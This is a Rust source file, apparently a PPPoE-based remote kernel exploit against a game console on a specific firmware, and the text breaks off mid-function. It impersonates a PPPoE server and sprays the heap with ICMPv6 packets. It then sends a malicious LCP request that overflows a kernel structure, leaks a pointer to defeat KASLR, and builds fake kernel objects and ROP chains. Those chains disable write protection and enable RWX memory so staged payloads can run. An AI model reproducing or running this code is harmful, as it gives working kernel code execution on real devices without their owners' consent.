// Import the constants module
use crate::constants;
use std::io::{self, Write};

// Import and re-export only what needs to be re exported.
mod lcp_echo_handler;
mod network_structs;
mod offsets;
mod packet_checking;
mod packet_creation;
mod utils;

extern crate hwaddr;
extern crate packet;
extern crate pnet;

use packet::ether;
// use packet::ip::v4::Option;
use packet::Builder;
use pnet::datalink::{DataLinkReceiver, DataLinkSender, NetworkInterface};

use std::convert::TryInto;
use std::process;
use std::str::FromStr;
use std::thread;
// Add this line to bring FromStr into scope
use std::time;

use packet_creation::{
    create_icmpv6_adv, create_icmpv6_echo_req, create_ipcp_conf_ack, create_ipcp_conf_nak,
    create_ipcp_conf_request, create_ipv4_packet, create_lcp_conf_ack, create_lcp_conf_request,
    create_lcp_term_req, create_pado_packet, create_pads_packet, create_padt_packet,
    create_udp_header,
};

use packet_checking::{
    is_icmpv6_echo_reply, is_icmpv6_nd_ns, is_icmpv6_router_sol, is_ipcp_conf_ack,
    is_ipcp_conf_req, is_lcp_conf_ack, is_lcp_conf_reject, is_lcp_conf_req, is_padi_packet,
    is_padr_packet,
};

use utils::{create_ethernet_channel, listen_for_corruption, listen_for_packet};

use offsets::OFFSETS_FW_1100;

// Public re exports
pub use lcp_echo_handler::LcpEchoHandler;
pub struct Exploit {
    pub source_mac: [u8; 6],
    pub target_mac: [u8; 6],
    pub pppoe_softc: u64,
    pub host_uniq: [u8; 8],
    pub target_ipv6: [u8; 16],
    pub source_ipv6: [u8; 16],
    pub kaslr_offset: u64,
    pub stage1: Vec<u8>,
    pub stage2: Vec<u8>,
}

impl Exploit {
    pub fn capture_first_padi(&mut self, interface: &NetworkInterface) {
        let (mut _tx, mut rx) = create_ethernet_channel(interface).unwrap();
        println!("[+] Waiting for first PADI");
        let first_ignore_padi = listen_for_packet(rx.as_mut(), is_padi_packet);
        self.handle_padi(&first_ignore_padi.unwrap());
    }

    fn print_current_state(&self) {
        // Format MAC addresses
        println!("[+] [+] [+] START REPORT CURRENT STATUS [+] [+] [+]");
        let target_mac_str = self
            .target_mac
            .iter()
            .map(|byte| format!("{:02x}", byte))
            .collect::<Vec<String>>()
            .join(":");
        println!("[+] Target MAC: {}", target_mac_str);
        let source_mac_str = self
            .source_mac
            .iter()
            .map(|byte| format!("{:02x}", byte))
            .collect::<Vec<String>>()
            .join(":");
        println!("[+] Source MAC: {}", source_mac_str);
        // Format IPv6 addresses
        let target_ipv6_str = self
            .target_ipv6
            .chunks(2)
            .map(|chunk| format!("{:02x}{:02x}", chunk[0], chunk[1]))
            .collect::<Vec<String>>()
            .join(":");
        println!("[+] Target IPv6: {}", target_ipv6_str);
        let source_ipv6_str = self
            .source_ipv6
            .chunks(2)
            .map(|chunk| format!("{:02x}{:02x}", chunk[0], chunk[1]))
            .collect::<Vec<String>>()
            .join(":");
        println!("[+] Source IPv6: {}", source_ipv6_str);
        // Print the PPPoE softc and KASLR offset
        println!("[+] PPPoE softc: {:#x}", self.pppoe_softc);
        println!("[+] KASLR Offset: {:#x}", self.kaslr_offset);
        println!("[+] [+] [+] END REPORT CURRENT STATUS [+] [+] [+]");
    }

    pub fn ppp_negotiation(&mut self, interface: &NetworkInterface, ac_cookie: Option<Vec<u8>>) {
        self.print_current_state();

        if ac_cookie.is_some() {
            println!(
                "[+] AC cookie length: {}",
                ac_cookie.as_ref().unwrap().len()
            );
        }
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        let padi = listen_for_packet(rx.as_mut(), is_padi_packet);
        self.handle_padi(&padi.unwrap());

        let pado = create_pado_packet(self.source_mac, self.target_mac, ac_cookie, self.host_uniq);
        println!("[+] Sending PADO...");
        let _result = tx
            .send_to(&pado, None)
            .expect("[-] Failed to send PADO packet");
        println!("[+] Waiting for PADR...");
        let _padr = listen_for_packet(rx.as_mut(), is_padr_packet);
        // Send PADS
        println!("[+] Sending PADS");
        let pads = create_pads_packet(
            self.source_mac,
            self.target_mac,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            self.host_uniq,
        );
        let _result = tx
            .send_to(&pads, None)
            .expect("[-] Failed to send PADS packet");
    }

    pub fn lcp_negotiation(&mut self, interface: &NetworkInterface) {
        //  Create LCP Configure request

        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        println!("[+] Sending LCP configure request...");
        let lcp_configure = create_lcp_conf_request(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            None,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send lcp_configure packet");

        println!("[+] Waiting for LCP configure ACK...");
        let _result = listen_for_packet(rx.as_mut(), is_lcp_conf_ack);
        println!("[+] Waiting for LCP configure request...");
        let result = listen_for_packet(rx.as_mut(), is_lcp_conf_req);
        println!("[+] Sending LCP configure ACK...");
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        let lcp_conf_ack = create_lcp_conf_ack(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id,
        );
        let _result = tx
            .send_to(&lcp_conf_ack, None)
            .expect("[-] Failed to send lcp_conf_ack packet");
    }

    pub fn ipcp_negotiation(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();
        // Send IPCP conf request
        println!("[+] Sending IPCP configure request...");
        let lcp_configure = create_ipcp_conf_request(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            constants::LCP_ID,
            constants::SOURCE_IPV4,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure req packet");
        // wait for Rec conf ack
        println!("[+] Waiting for IPCP configure ACK...");
        let _result = listen_for_packet(rx.as_mut(), is_ipcp_conf_ack);
        // wait for req conf
        println!("[+] Waiting for IPCP configure request...");
        let result = listen_for_packet(rx.as_mut(), is_ipcp_conf_req);
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        // send nak
        println!("[+] Sending IPCP configure NAK...");
        let lcp_configure = create_ipcp_conf_nak(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id,
            constants::TARGET_IPV4,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure NAK packet");
        // wait for req conf
        println!("[+] Waiting for IPCP configure request...");
        let result: Option<Vec<u8>> = listen_for_packet(rx.as_mut(), is_ipcp_conf_req);
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        // send conf ack
        println!("[+] Sending IPCP configure ACK...");
        let lcp_configure = create_ipcp_conf_ack(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id, // todo actually take it from the req
            constants::TARGET_IPV4,
            constants::FAKE_PRIMARY_DNS_SERVER,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure ACK packet");
    }

    pub fn handle_padi(&mut self, data: &[u8]) {
        // println!("[+] PADI packet received");
        // Extracting Host Unique Tag and populating the self.pppoe_softc
        self.host_uniq = extract_host_uniq(data).unwrap();
        self.pppoe_softc = u64::from_le_bytes(self.host_uniq);
        // Format and print pppoe_softc in hexadecimal format with 0x prefix
        println!("[+] pppoe_softc: 0x{:x}", self.pppoe_softc);
        // Extract and update source mac
        self.target_mac = extract_ps4_mac(data).unwrap();
        // Format target MAC in colon-separated hex format
    }

    pub fn heap_grooming(&mut self, interface: &NetworkInterface) {
        // Open channel
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        // Wait for the ICMPv6 Router Solicitation packet
        println!("[+] Waiting for Router Solicitation packet");
        let result = listen_for_packet(rx.as_mut(), is_icmpv6_router_sol);
        self.target_ipv6 = result.unwrap()[22..38].try_into().unwrap();
        println!("[+] Target IPv6 {:?}", self.target_ipv6);
        // Enters grooming loop
        spray(
            tx.as_mut(),
            rx.as_mut(),
            self.source_mac,
            self.target_mac,
            self.target_ipv6,
        );
        println!("\n[+] Heap grooming...done");
    }

    pub fn memory_corruption(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        pin_to_cpu_0(tx.as_mut(), self.source_mac, self.target_mac);
        thread::sleep(time::Duration::from_secs(1));

        // Corrupt in6_llentry object
        let overflow_lle = build_overflow_lle(self.pppoe_softc);
        println!("[+] Sending malicious LCP configure request...");
        let mal_request = create_lcp_conf_request(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            Some(overflow_lle),
        );
        let _result = tx
            .send_to(&mal_request, None)
            .expect("[-] Failed to send IPCP configure req packet");
        println!("[+] Waiting for LCP configure reject...");
        listen_for_packet(rx.as_mut(), is_lcp_conf_reject);
        // Re-negotiate after rejection
        self.lcp_negotiation(interface);
        self.ipcp_negotiation(interface);

        // Now search for the corrupted object
        let corrupted_source_ipv6: Option<[u8; 16]> = search_for_corrupted_obj(
            tx.as_mut(),
            rx.as_mut(),
            self.source_mac,
            self.target_mac,
            self.target_ipv6,
        );

        match corrupted_source_ipv6 {
            Some(source_ipv6) => {
                println!(
                    "\n[+] Scanning for corrupted object...\nFound -> {:x?}",
                    source_ipv6
                );
                self.source_ipv6 = source_ipv6;
            }
            None => {
                println!("[-] Scanning for corrupted object...failed. Please retry the exploit.");
                process::exit(1);
            }
        }
    }

    pub fn defeat_kaslr(&mut self, interface: &NetworkInterface) {
        let (mut _tx, mut rx) = create_ethernet_channel(interface).unwrap();
        // Declare packet outside the loop
        let mut packet = Vec::new();

        // Keep listening until we get a packet with the desired length
        loop {
            packet = listen_for_packet(rx.as_mut(), is_icmpv6_nd_ns).unwrap();
            if packet.len() >= 89 {
                //TODO change
                break;
            }
        }
        // Extract the ICMPv6 payload and parse the relevant field
        if let Some(pppoe_softc_list) = extract_pppoe_softc_list(&packet) {
            println!("[+] pppoe_softc_list: {:#x}", pppoe_softc_list);

            // Calculate the KASLR offset
            let kaslr_offset = pppoe_softc_list.wrapping_sub(OFFSETS_FW_1100.pppoe_softc_list);
            println!("[+] kaslr_offset: {:#x}", kaslr_offset);
            self.kaslr_offset = kaslr_offset;

            // Validate the leak based on address comparison
            if (pppoe_softc_list & 0xffffffff00000fff)
                != (OFFSETS_FW_1100.pppoe_softc_list & 0xffffffff00000fff)
            {
                println!("[-] Error leak is invalid. Wrong firmware?");
                process::exit(1);
            }
        } else {
            println!("[-] Failed to extract pppoe_softc_list");
            process::exit(1);
        }
    }

    pub fn remote_code_exec(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();
        let lcp_term = create_lcp_term_req(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            0,
        );
        let _result = tx
            .send_to(lcp_term.as_slice(), None)
            .expect("[-] Failed to send lcp term request");
        let fake_lle = self.build_fake_lle();
        self.ppp_negotiation(interface, Some(fake_lle));
        let icmpv6_echo_req = create_icmpv6_echo_req(
            self.source_mac,
            self.target_mac,
            constants::SOURCE_IPV6,
            self.target_ipv6,
        );
        let _result = tx
            .send_to(icmpv6_echo_req.as_slice(), None)
            .expect("[-] Failed to icmpv6_echo_req request");
        println!("[+] Waiting for stage1 to resume...");
        let mut i = 0; // Wait for 3 lcp conf req
        while i < 3 {
            let _packet = listen_for_packet(rx.as_mut(), is_lcp_conf_req);
            i += 1;
        }
        // Send PADT
        let padt = create_padt_packet(
            self.source_mac,
            self.target_mac,
            constants::PPPOE_SESSION_ID.to_le_bytes(),
        );
        println!("[+] Sending PADT...");
        let _result = tx
            .send_to(padt.as_slice(), None)
            .expect("[-] Failed to send padt");
    }

    pub fn frag_and_send(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut _rx) = create_ethernet_channel(interface).unwrap();
        let total_length: usize = self.stage2.len();
        let udp_header = create_udp_header(
            [0x00, 0x35], //TODO hardodce
            [0x23, 0x3c], // TODO
            total_length + 8,
        ); //TODO add udp checksum
        let mut tobefrag = Vec::new();
        tobefrag.extend_from_slice(&udp_header);
        tobefrag.extend_from_slice(&self.stage2);

        let frags = fragment(tobefrag);
        for (i, frag) in frags.iter().enumerate() {
            let foff: usize = 128 * i;
            let current_udp_packet = create_ipv4_packet(
                constants::SOURCE_IPV4,
                constants::TARGET_IPV4,
                i == 2, //todo make this last
                frag.to_vec(),
                foff,
            );
            let mut ethernet_packet = Vec::new();
            //current_udp_packets
            ethernet_packet.extend(self.target_mac);
            ethernet_packet.extend(self.source_mac);
            ethernet_packet.extend(current_udp_packet);

            let _result = tx
                .send_to(ethernet_packet.as_slice(), None)
                .expect("[-] Failed to send etherpacket");
        }
    }

    pub fn build_fake_ifnet(&mut self) -> Vec<u8> {
        let planted = (self.pppoe_softc + 0x07) & 0xffffffffffff; // Add 7 and truncate to 48
        let planted_bytes = planted.to_be_bytes();
        let truncated_bytes: [u8; 6] = planted_bytes[2..8]
            .try_into()
            .expect("slice with incorrect length");
        self.source_mac = truncated_bytes;
        self.source_mac.reverse(); // For endianness TODO make this agnostic

        self.print_current_state();
        // Fake ifnet
        let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
        fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
        fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
        fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
        fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
        fake_ifnet.push(constants::IFT_ETHER); // ifi_type
        fake_ifnet.push(0); // ifi_physical
        fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
        fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

        fake_ifnet.extend(&(self.pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
        fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
        fake_ifnet.extend(&(self.pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                           // if_afdata_lock

        fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
        fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
        fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
        fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
        fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
        fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                                  // if_addr_mtx

        fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

        fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
        fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
        fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
        fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
        fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
        fake_ifnet
    }

    pub fn build_fake_lle(&mut self) -> Vec<u8> {
        let planted = (self.kaslr_offset + OFFSETS_FW_1100.first_gadget) & 0xffffffffffff;
        self.source_mac = planted.to_le_bytes()[..6].try_into().unwrap();
        // Format source MAC in colon-separated hex format
        self.print_current_state();

        // Fake in6_llentry
        let mut fake_lle = vec![0x00; 0x00]; // Initiaslize empty byte array
                                             // lle_next (Third gadget)
        let lle_next = (self.kaslr_offset
            + OFFSETS_FW_1100.pop_rbx_pop_r14_pop_rbp_jmp_qword_ptr_rsi_10)
            .to_le_bytes();
        fake_lle.extend(&lle_next);
        fake_lle.extend(&0u64.to_le_bytes()); // lle_prev (NULL)
                                              // lle_lock (Fourth gadget)
        let lle_lock = (self.kaslr_offset + OFFSETS_FW_1100.lea_rsp_rsi_20_repz_ret).to_le_bytes();
        fake_lle.extend(&lle_lock);
        let lo_flags = (constants::RW_INIT_FLAGS | constants::LO_DUPOK).to_le_bytes();
        fake_lle.extend(&lo_flags);
        fake_lle.extend(&0u32.to_le_bytes()); // lo_data
        let lo_witness = (self.kaslr_offset + OFFSETS_FW_1100.add_rsp_b0_pop_rbp_ret).to_le_bytes();
        fake_lle.extend(&lo_witness);
        fake_lle.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                                // lle_tbl
        let lle_tbl = (self.pppoe_softc + constants::PPPOE_SOFTC_SC_DEST
            - constants::LLTABLE_LLTFREE)
            .to_le_bytes();
        fake_lle.extend(&lle_tbl);
        fake_lle.extend(&0u64.to_le_bytes()); // lle_head (NULL)
        fake_lle.extend(&0u64.to_le_bytes()); // lle_free (NULL)
        fake_lle.extend(&0u64.to_le_bytes()); // la_hold (NULL)
        fake_lle.extend(&0u32.to_le_bytes()); // la_numheld
        fake_lle.extend(&0u32.to_le_bytes()); // pads
        fake_lle.extend(&0u64.to_le_bytes()); // la_expire
        let la_flags = (constants::LLE_STATIC | constants::LLE_EXCLUSIVE).to_le_bytes();
        fake_lle.extend(&la_flags);
        fake_lle.extend(&0u16.to_le_bytes()); // la_asked
        fake_lle.extend(&0u16.to_le_bytes()); // la_preempt
        fake_lle.extend(&0u16.to_le_bytes()); // ln_byhint
        let ln_state = constants::ND6_LLINFO_NOSTATE.to_le_bytes();
        fake_lle.extend(&ln_state);
        fake_lle.extend(&0u16.to_le_bytes()); // ln_router
        fake_lle.extend(&0u32.to_le_bytes()); // pad
        fake_lle.extend(&0x7fffffffffffffffu64.to_le_bytes()); // ln_ntick
        fake_lle.extend(&0u32.to_le_bytes()); // lle_refcnt
        fake_lle.extend(&0u32.to_le_bytes()); // pad
                                              // ll_addr (big-endian)
        let ll_addr = 0x414141414141u64.to_be_bytes();
        fake_lle.extend(&ll_addr);
        // lle_timer
        fake_lle.extend(&0u64.to_le_bytes()); // sle
        fake_lle.extend(&0u64.to_le_bytes()); // tqe
        fake_lle.extend(&0u32.to_le_bytes()); // c_time
        fake_lle.extend(&0u32.to_le_bytes()); // pad
        fake_lle.extend(&0u64.to_le_bytes()); // c_arg (NULL)
        fake_lle.extend(&0u64.to_le_bytes()); // c_func (NULL)
        fake_lle.extend(&0u64.to_le_bytes()); // c_lock (NULL)
        let c_flags = constants::CALLOUT_RETURNUNLOCKED.to_le_bytes();
        fake_lle.extend(&c_flags);
        fake_lle.extend(&0u32.to_le_bytes()); // c_cpu
                                              // l3_addr6
        let sin6_len = constants::SOCKADDR_IN6_SIZE.to_le_bytes();
        fake_lle.extend(&sin6_len);
        let sin6_family = constants::AF_INET6.to_le_bytes();
        fake_lle.extend(&sin6_family);
        fake_lle.extend(&0u16.to_le_bytes()); // sin6_port
        fake_lle.extend(&0u32.to_le_bytes()); // sin6_flowinfo
        let sin6_addr = 0xfe80000100000000u64.to_be_bytes();
        fake_lle.extend(&sin6_addr);
        let sin6_addr_2 = 0x4141414141414141u64.to_be_bytes();
        fake_lle.extend(&sin6_addr_2);
        fake_lle.extend(&0u32.to_le_bytes()); // sin6_scope_id

        // Pad
        fake_lle.extend(&0u32.to_le_bytes());

        // Second gadget
        let second_gadget = self.kaslr_offset + OFFSETS_FW_1100.push_rbp_jmp_qword_ptr_rsi;
        let start: usize = OFFSETS_FW_1100.second_gadget_off.try_into().unwrap();
        let end: usize = (OFFSETS_FW_1100.second_gadget_off + 8).try_into().unwrap();
        fake_lle[start..end].copy_from_slice(&second_gadget.to_le_bytes());

        // Second ROP chain
        let rop2 = build_second_rop(self.kaslr_offset, self.stage1.len());
        // First ROP chain
        let rop = build_first_rop(self.stage1.len(), &fake_lle, &rop2, self.kaslr_offset);

        // Return the combined fake lle and ROP chains
        [fake_lle, rop, rop2, self.stage1.clone()].concat()
    }
}

fn extract_pppoe_softc_list(packet: &[u8]) -> Option<u64> {
    if packet.len() >= 0x4b {
        let bytes = &packet[0x51..0x59];
        // Convert the extracted bytes into a 64-bit integer (little-endian)
        let mut arr = [0u8; 8];
        arr[..bytes.len()].copy_from_slice(bytes);
        Some(u64::from_le_bytes(arr))
    } else {
        None
    }
}

fn pin_to_cpu_0(tx: &mut dyn DataLinkSender, source_mac: [u8; 6], target_mac: [u8; 6]) {
    for i in 0..constants::PIN_NUM {
        let progress = 100 * i / constants::PIN_NUM;
        print!("\r[+] Pinning to CPU 0... {}%", progress);
        io::stdout().flush().unwrap();

        // Create etherpacket
        let packet = ether::Builder::default()
            .source(source_mac.into())
            .unwrap()
            .destination(target_mac.into())
            .unwrap()
            .protocol(ether::Protocol::PppoeSession)
            .unwrap()
            .build()
            .unwrap();
        // Send the request
        let _result = tx
            .send_to(packet.as_slice(), None)
            .expect("[-] Failed to send etherpacket");
        thread::sleep(time::Duration::from_millis(1));
    }
    println!("\n[+] Pinning to CPU 0...done")
}

fn extract_host_uniq(data: &[u8]) -> Result<[u8; 8], Box<dyn std::error::Error>> {
    let mut result = [0u8; 8];
    // Go to the tags
    let mut offset = constants::ETH_HEADER_LEN + constants::PPPOE_HEADER_LEN;
    // Read all the tags until possible
    while offset + constants::PPPOE_TAG_HEADER_LEN <= data.len() {
        // Read Header
        let tag_type = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let tag_len = u16::from_be_bytes([data[offset + 2], data[offset + 3]]) as usize;
        offset += constants::PPPOE_TAG_HEADER_LEN;
        if tag_type == constants::PPPOE_TAG_HOST_UNIQ && offset + tag_len <= data.len() {
            // Extract the Host-Uniq tag value
            let host_uniq = &data[offset..offset + tag_len];
            if tag_len == 8 {
                // If Host-Uniq is expected to be a 64-bit integer, interpret it as Big-Endian
                result.copy_from_slice(host_uniq);
                // println!("[+] Extracted Host-Uniq: {:?}", result);
                break;
            }
        }
        // Go to next tag
        offset += tag_len;
    }
    Ok(result)
}

fn extract_ps4_mac(data: &[u8]) -> Result<[u8; 6], Box<dyn std::error::Error>> {
    // Extract the source MAC address
    let offset = constants::ETH_SOURCE_MAC;
    let mac_bytes = &data[offset..offset + 6];
    // Create a 6-byte array and copy the data into it
    let mut mac_address = [0u8; 6];
    mac_address.copy_from_slice(mac_bytes);
    Ok(mac_address)
}

fn search_for_corrupted_obj(
    tx: &mut dyn DataLinkSender,
    rx: &mut dyn DataLinkReceiver,
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    target_v6: [u8; 16],
) -> Option<[u8; 16]> {
    for i in (0..constants::SPRAY_NUM).rev() {
        let progress = 100 * i / constants::SPRAY_NUM;
        print!("\r[+] Search for corrupted object at {}%", progress);
        io::stdout().flush().unwrap();

        if i >= constants::HOLE_START && i % constants::HOLE_SPACE == 0 {
            continue;
        }
        let source_v6_string = format!("fe80::{:04x}:4141:4141:4141", i);
        let source_v6: [u8; 16] = std::net::Ipv6Addr::from_str(&source_v6_string)
            .expect("Failed to parse IPv6 address")
            .octets();
        // listen for
        let icmpv6_req = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_req.as_slice(), None)
            .expect("[-] Failed to send icmpv6");
        // Listen for packet if echo reply break,else if neighboard solicitation then corrupted
        let currupted = listen_for_corruption(rx);
        if currupted {
            return Some(source_v6);
        }
        let icmpv6_adv = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);
        // Send the request
        let _result = tx
            .send_to(icmpv6_adv.as_slice(), None)
            .expect("[-] Failed to send icmpv6adv");
    }
    None
}

fn spray(
    tx: &mut dyn DataLinkSender,
    rx: &mut dyn DataLinkReceiver,
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    target_v6: [u8; 16],
) {
    for i in 0..constants::SPRAY_NUM {
        let progress = 100 * i / constants::SPRAY_NUM;
        // Print progress in place using carriage return
        print!("\r[+] Heap Grooming at {}%", progress);
        io::stdout().flush().unwrap();

        let source_v6_string = format!("fe80::{:04x}:4141:4141:4141", i);
        let source_v6: [u8; 16] = std::net::Ipv6Addr::from_str(&source_v6_string)
            .expect("Failed to parse IPv6 address")
            .octets();
        let icmpv6_req = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_req.as_slice(), None)
            .expect("[-] Failed to send icmpv6");
        //  Wait for response for each req
        let _result = listen_for_packet(rx, is_icmpv6_nd_ns);
        if i >= constants::HOLE_START && i % constants::HOLE_SPACE == 0 {
            continue;
        }
        //  Sends advertisment only to certain response to create hole in the target heap

        let icmpv6_adv = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_adv.as_slice(), None)
            .expect("[-] Failed to send icmpv6adv");
        let _result = listen_for_packet(rx, is_icmpv6_echo_reply);
    }
}

// Create a UDP packet and fragment it
fn fragment(stage2: Vec<u8>) -> Vec<Vec<u8>> {
    // Simulate UDP packet creation and IP fragmentation
    let mut fragments = Vec::new();
    const MAX_FRAGMENT_SIZE: usize = 1024;
    // Fragment payload into chunks
    let mut offset = 0;
    while offset < stage2.len() {
        let fragment_size = std::cmp::min(MAX_FRAGMENT_SIZE, stage2.len() - offset);
        let fragment = &stage2[offset..offset + fragment_size];
        offset += fragment_size;

        let mut packet = Vec::new();
        packet.extend_from_slice(fragment);

        fragments.push(packet);
    }
    fragments
}

pub fn build_overflow_lle(pppoe_softc: u64) -> Vec<u8> {
    let mut overflow_lle = Vec::new();

    // lle_next
    overflow_lle.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_AC_COOKIE).to_le_bytes()); // le_next
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // le_prev

    // lle_lock
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lo_name
    overflow_lle.extend(&(constants::RW_INIT_FLAGS | constants::LO_DUPOK).to_le_bytes()); // lo_flags
    overflow_lle.extend(&0u32.to_le_bytes()); // lo_data
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    overflow_lle.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock

    // lle_tbl
    overflow_lle.extend(
        &(pppoe_softc + constants::PPPOE_SOFTC_SC_AC_COOKIE - constants::LLTABLE_LLTIFP)
            .to_le_bytes(),
    ); // lle_tbl
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lle_head
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lle_free
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // la_hold
    overflow_lle.extend(&0u32.to_le_bytes()); // la_numheld
    overflow_lle.extend(&0u32.to_le_bytes()); // pad
    overflow_lle.extend(&0u64.to_le_bytes()); // la_expire

    // la_flags and remaining fields
    overflow_lle.extend(&constants::LLE_EXCLUSIVE.to_le_bytes()); // la_flags
    overflow_lle.extend(&0u16.to_le_bytes()); // la_asked
    overflow_lle.extend(&0u16.to_le_bytes()); // la_preempt
    overflow_lle.extend(&0u16.to_le_bytes()); // ln_byhint
    overflow_lle.extend(&constants::ND6_LLINFO_NOSTATE.to_le_bytes()); // ln_state
    overflow_lle.extend(&0u16.to_le_bytes()); // ln_router
    overflow_lle.extend(&0u32.to_le_bytes()); // pad
    overflow_lle.extend(&0x7fffffffffffffff_u64.to_le_bytes()); // ln_ntick

    overflow_lle
}

pub fn build_second_rop(kaslr_offset: u64, stage1_len: usize) -> Vec<u8> {
    let mut rop = Vec::new();
    // setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdi_ret).to_le_bytes());
    rop.extend(&(constants::IDT_UD).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rsi_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.add_rsp_28_pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    rop.extend(&(constants::SDT_SYSIGT).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rcx_ret).to_le_bytes());
    rop.extend(&(constants::SEL_KPL).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_r8_pop_rbp_ret).to_le_bytes());
    rop.extend(&0u64.to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.setidt).to_le_bytes());

    // Disable write protection
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rsi_ret).to_le_bytes());
    rop.extend(&(constants::CR0_ORI & !constants::CR0_WP).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_cr0_rsi_ud2_mov_eax_1_ret).to_le_bytes());

    // Enable RWX in kmem_alloc
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rax_ret).to_le_bytes());
    rop.extend(&(constants::VM_PROT_ALL).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rcx_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.kmem_alloc_patch1).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_byte_ptr_rcx_al_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rcx_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.kmem_alloc_patch2).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_byte_ptr_rcx_al_ret).to_le_bytes());

    // Restore write protection
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rsi_ret).to_le_bytes());
    rop.extend(&(constants::CR0_ORI).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_cr0_rsi_ud2_mov_eax_1_ret).to_le_bytes());

